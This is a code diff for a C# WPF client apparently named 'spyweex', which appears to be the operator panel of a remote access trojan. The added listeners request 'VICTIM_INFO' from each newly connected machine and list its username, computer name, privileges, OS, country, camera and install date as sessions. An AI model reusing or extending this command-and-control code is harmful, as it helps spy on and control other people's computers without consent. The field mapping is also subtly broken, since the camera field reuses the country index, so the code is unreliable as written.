@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 
 using System.Reactive.Concurrency;
 using System.Reactive.Linq;
+using System.Threading;
 using System.Windows.Threading;
 using spyweex_client_wpf.StaticStrings;
 using System.Windows;
@@ -115,13 +116,14 @@ namespace spyweex_client_wpf
 
                     updateCmdTextBox("", result);
                     UnsubscribeAsync();
+
                     //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(
                     //    () =>
-                    //    {
-                    //        Form1.
+                    //    {       
                     //    }
                     //    ));
                     //PrintToCmdTextBox("", result);
+
                 },
                 err =>
                 {
@@ -133,6 +135,84 @@ namespace spyweex_client_wpf
            );
             subscriberToken = idisp;
 
+        }
+    }
+
+    /// <summary>
+    /// Listener to update session list (viewmodel) on new wxhtpclient received
+    /// </summary>
+    internal class ConnectionListener : ISubscriber
+    {
+        public void Subscribe(ConnectionInfoListener cil, ViewModel viewModel, WxhtpServiceServer server)
+        {
+            if (isSubscribed) return;
+            isSubscribed = true;
+
+            IDisposable idisp = server.getObservableSequenceOfConnections().
+            ObserveOn(Scheduler.CurrentThread).
+            Subscribe(
+                async ipEndPointString =>
+                {
+                    CancellationTokenSource cts = new CancellationTokenSource();
+                    CancellationToken ct;
+                    ct = cts.Token;
+                    WxhtpClient cl = server.TryGetClientByIpEndpoint(Utils.ParseIPEndpoint(ipEndPointString));
+                    await cl.ExecuteTask(ct, 
+                        cl.getTcpClient().Client.RemoteEndPoint.ToString(), 
+                        METHOD_TYPE.GET, 
+                        ACTION_TYPE.VICTIM_INFO);
+                    cil.Subscribe(viewModel, cl);
+                },
+                err =>
+                {
+                    Debug.WriteLine((Exception)err);
+                    MessageBoxResult result = MessageBox.Show("Error occured in SessionListener" + (Exception)err);
+                }
+            );
+
+            subscriberToken = idisp;
+        }
+    }
+
+    internal class ConnectionInfoListener : ISubscriber
+    {
+        public void Subscribe(ViewModel viewModel, WxhtpClient wxhtpClient)
+        {
+            if (isSubscribed) return;
+            isSubscribed = true;
+            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
+                getObservableSequenceOfReponses().
+                ObserveOn(TaskPoolScheduler.Default).
+                Subscribe(
+                response =>
+                {
+                    string data = response.content.ToString();
+                    string[] results = data.Split(new string[] { "%%" }, StringSplitOptions.None);
+                    Session s = new Session
+                                {
+                                    ID = (viewModel.sessions.Count + 1).ToString(),
+                                    IP = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(),
+                                    Username = results[0],
+                                    ComputerName = results[1],
+                                    Privileges = results[2],
+                                    OS = results[3],
+                                    Uptime = results[4],
+                                    Country = results[5], // get country by ip
+                                    Cam = results[5],
+                                    InstallDate = results[6]
+                                };
+                    viewModel.sessions.Add(s);
+                    UnsubscribeAsync();
+                },
+                err =>
+                {
+                    Debug.WriteLine((Exception)err);
+                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
+                    UnsubscribeAsync();
+                }
+
+           );
+            subscriberToken = idisp;
         }
     }
 }
